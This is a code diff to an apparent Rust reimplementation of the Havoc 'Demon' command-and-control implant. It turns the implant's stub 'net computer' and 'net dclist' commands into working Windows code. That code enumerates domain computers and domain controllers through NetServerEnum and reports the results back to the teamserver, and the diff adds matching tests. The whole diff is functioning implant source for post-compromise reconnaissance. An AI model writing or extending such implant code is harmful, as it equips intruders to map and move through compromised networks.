@@ -1644,8 +1644,8 @@ fn handle_net(payload: &[u8]) -> DispatchResult {
         DemonNetCommand::Domain => handle_net_domain(),
         DemonNetCommand::Logons => handle_net_logons(rest),
         DemonNetCommand::Sessions => handle_net_sessions(rest),
-        DemonNetCommand::Computer => handle_net_name_list(subcmd_raw, rest),
-        DemonNetCommand::DcList => handle_net_name_list(subcmd_raw, rest),
+        DemonNetCommand::Computer => handle_net_computer(rest),
+        DemonNetCommand::DcList => handle_net_dclist(rest),
         DemonNetCommand::Share => handle_net_share(rest),
         DemonNetCommand::LocalGroup => handle_net_groups(subcmd_raw, rest),
         DemonNetCommand::Group => handle_net_groups(subcmd_raw, rest),
@@ -1732,25 +1732,58 @@ fn handle_net_sessions(rest: &[u8]) -> DispatchResult {
 /// Computer and DcList are stubs in the original Havoc Demon. We implement the
 /// wire format so the teamserver can parse a valid (possibly empty) response.
 ///
-/// Incoming: `[server_name: len-prefixed UTF-16LE]`
-/// Response (LE): `[subcmd: u32][server_name: UTF-16LE][name: UTF-16LE]…`
-fn handle_net_name_list(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
+/// `DEMON_NET_COMMAND_COMPUTER` (4): enumerate computers in the domain.
+///
+/// Incoming: `[domain: len-prefixed UTF-16LE]`
+/// Response (LE): `[4: u32][domain: UTF-16LE][computer_name: UTF-16LE]…`
+fn handle_net_computer(rest: &[u8]) -> DispatchResult {
     let mut offset = 0;
-    let server_bytes = match parse_bytes_le(rest, &mut offset) {
+    let domain_bytes = match parse_bytes_le(rest, &mut offset) {
         Ok(b) => b,
         Err(e) => {
-            warn!(subcmd_raw, "NetNameList: failed to parse server name: {e}");
+            warn!("NetComputer: failed to parse domain: {e}");
             return DispatchResult::Ignore;
         }
     };
-    let server = decode_utf16le_null(&server_bytes);
+    let domain = decode_utf16le_null(&domain_bytes);
 
-    info!(server = %server, subcmd = subcmd_raw, "NetNameList (stub)");
+    let computers = platform_computers(&domain);
+    info!(domain = %domain, count = computers.len(), "NetComputer");
 
     let mut payload = Vec::new();
-    write_u32_le(&mut payload, subcmd_raw);
-    write_utf16le(&mut payload, &server);
-    // Empty list — stubs, matching original Havoc Demon behaviour.
+    write_u32_le(&mut payload, u32::from(DemonNetCommand::Computer));
+    write_utf16le(&mut payload, &domain);
+    for name in &computers {
+        write_utf16le(&mut payload, name);
+    }
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
+}
+
+/// `DEMON_NET_COMMAND_DCLIST` (5): list domain controllers.
+///
+/// Incoming: `[domain: len-prefixed UTF-16LE]`
+/// Response (LE): `[5: u32][domain: UTF-16LE][dc_name: UTF-16LE]…`
+fn handle_net_dclist(rest: &[u8]) -> DispatchResult {
+    let mut offset = 0;
+    let domain_bytes = match parse_bytes_le(rest, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("NetDcList: failed to parse domain: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let domain = decode_utf16le_null(&domain_bytes);
+
+    let dcs = platform_dc_list(&domain);
+    info!(domain = %domain, count = dcs.len(), "NetDcList");
+
+    let mut payload = Vec::new();
+    write_u32_le(&mut payload, u32::from(DemonNetCommand::DcList));
+    write_utf16le(&mut payload, &domain);
+    for name in &dcs {
+        write_utf16le(&mut payload, name);
+    }
 
     DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
 }
@@ -1981,6 +2014,115 @@ fn platform_users() -> Vec<NetUser> {
         }
     }
     users
+}
+
+/// Enumerate computers in `domain` using `NetServerEnum`.
+///
+/// On Windows calls `NetServerEnum` with `SV_TYPE_ALL` scoped to the given
+/// domain.  On non-Windows returns an empty list (no equivalent API).
+fn platform_computers(domain: &str) -> Vec<String> {
+    #[cfg(windows)]
+    {
+        platform_servers_by_type(
+            domain,
+            windows_sys::Win32::NetworkManagement::NetManagement::SV_TYPE_ALL,
+        )
+    }
+    #[cfg(not(windows))]
+    {
+        let _ = domain;
+        Vec::new()
+    }
+}
+
+/// Enumerate domain controllers in `domain` using `NetServerEnum`.
+///
+/// On Windows calls `NetServerEnum` filtering to DC and backup-DC server
+/// types.  On non-Windows returns an empty list (no equivalent API).
+fn platform_dc_list(domain: &str) -> Vec<String> {
+    #[cfg(windows)]
+    {
+        use windows_sys::Win32::NetworkManagement::NetManagement::{
+            SV_TYPE_DOMAIN_BAKCTRL, SV_TYPE_DOMAIN_CTRL,
+        };
+        platform_servers_by_type(domain, SV_TYPE_DOMAIN_CTRL | SV_TYPE_DOMAIN_BAKCTRL)
+    }
+    #[cfg(not(windows))]
+    {
+        let _ = domain;
+        Vec::new()
+    }
+}
+
+/// Shared helper: call `NetServerEnum` with the given `server_type` mask
+/// against `domain` and return the list of server names.
+#[cfg(windows)]
+#[allow(unsafe_code)]
+fn platform_servers_by_type(domain: &str, server_type: u32) -> Vec<String> {
+    use windows_sys::Win32::Foundation::ERROR_MORE_DATA;
+    use windows_sys::Win32::NetworkManagement::NetManagement::{
+        NetApiBufferFree, NetServerEnum, SERVER_INFO_101,
+    };
+
+    // Encode domain as null-terminated UTF-16.
+    let domain_w: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();
+    let domain_ptr = if domain.is_empty() { std::ptr::null() } else { domain_w.as_ptr() };
+
+    let mut names = Vec::new();
+    let mut resume_handle: u32 = 0;
+
+    loop {
+        let mut buf: *mut u8 = std::ptr::null_mut();
+        let mut entries_read: u32 = 0;
+        let mut total_entries: u32 = 0;
+
+        // SAFETY: All pointers are valid; `buf` is written by the API and
+        // must be freed with `NetApiBufferFree`.
+        let status = unsafe {
+            NetServerEnum(
+                std::ptr::null(), // local machine as server
+                101,              // SERVER_INFO_101
+                &mut buf,
+                u32::MAX, // MAX_PREFERRED_LENGTH
+                &mut entries_read,
+                &mut total_entries,
+                server_type,
+                domain_ptr,
+                &mut resume_handle,
+            )
+        };
+
+        if !buf.is_null() && entries_read > 0 {
+            // SAFETY: `buf` points to an array of `entries_read` SERVER_INFO_101 structs.
+            let entries = unsafe {
+                std::slice::from_raw_parts(buf as *const SERVER_INFO_101, entries_read as usize)
+            };
+            for entry in entries {
+                if !entry.sv101_name.is_null() {
+                    // SAFETY: `sv101_name` is a valid null-terminated UTF-16 string.
+                    let name = unsafe {
+                        let mut len = 0usize;
+                        while *entry.sv101_name.add(len) != 0 {
+                            len += 1;
+                        }
+                        std::slice::from_raw_parts(entry.sv101_name, len)
+                    };
+                    names.push(String::from_utf16_lossy(name).into_owned());
+                }
+            }
+        }
+
+        if !buf.is_null() {
+            // SAFETY: `buf` was allocated by `NetServerEnum`.
+            unsafe { NetApiBufferFree(buf as *mut _) };
+        }
+
+        if status != ERROR_MORE_DATA {
+            break;
+        }
+    }
+
+    names
 }
 
 // ─── COMMAND_TOKEN (40) ─────────────────────────────────────────────────────
@@ -5479,7 +5621,7 @@ mod tests {
     }
 
     #[test]
-    fn handle_net_computer_returns_stub_with_server() {
+    fn handle_net_computer_echoes_domain_and_correct_subcmd() {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("CORP.LOCAL");
         let package = net_package(DemonNetCommand::Computer, &rest);
@@ -5495,17 +5637,38 @@ mod tests {
         ) else {
             panic!("expected Respond");
         };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
         assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Computer));
-        // Server name must be echoed.
-        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
-        let server = decode_utf16le_null(&resp.payload[8..8 + server_len]);
-        assert_eq!(server, "CORP.LOCAL");
-        // Stub: no entries after server name.
-        assert_eq!(resp.payload.len(), 8 + server_len);
+        // Domain name must be echoed as len-prefixed UTF-16LE after subcmd.
+        let domain_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
+        let domain = decode_utf16le_null(&resp.payload[8..8 + domain_len]);
+        assert_eq!(domain, "CORP.LOCAL");
+        // On non-Windows there is no NetServerEnum — list is empty, payload ends after domain.
+        #[cfg(not(windows))]
+        assert_eq!(resp.payload.len(), 8 + domain_len);
     }
 
     #[test]
-    fn handle_net_dclist_returns_stub_with_server() {
+    fn handle_net_computer_missing_domain_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let package = net_package(DemonNetCommand::Computer, &[]);
+        assert!(matches!(
+            dispatch(
+                &package,
+                &mut config,
+                &mut TokenVault::new(),
+                &mut DownloadTracker::new(),
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
+            ),
+            DispatchResult::Ignore
+        ));
+    }
+
+    #[test]
+    fn handle_net_dclist_echoes_domain_and_correct_subcmd() {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("CORP.LOCAL");
         let package = net_package(DemonNetCommand::DcList, &rest);
@@ -5521,7 +5684,34 @@ mod tests {
         ) else {
             panic!("expected Respond");
         };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
         assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::DcList));
+        // Domain name must be echoed as len-prefixed UTF-16LE after subcmd.
+        let domain_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
+        let domain = decode_utf16le_null(&resp.payload[8..8 + domain_len]);
+        assert_eq!(domain, "CORP.LOCAL");
+        // On non-Windows there is no NetServerEnum — list is empty, payload ends after domain.
+        #[cfg(not(windows))]
+        assert_eq!(resp.payload.len(), 8 + domain_len);
+    }
+
+    #[test]
+    fn handle_net_dclist_missing_domain_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let package = net_package(DemonNetCommand::DcList, &[]);
+        assert!(matches!(
+            dispatch(
+                &package,
+                &mut config,
+                &mut TokenVault::new(),
+                &mut DownloadTracker::new(),
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new(),
+                &crate::coffeeldr::new_bof_output_queue(),
+            ),
+            DispatchResult::Ignore
+        ));
     }
 
     #[test]
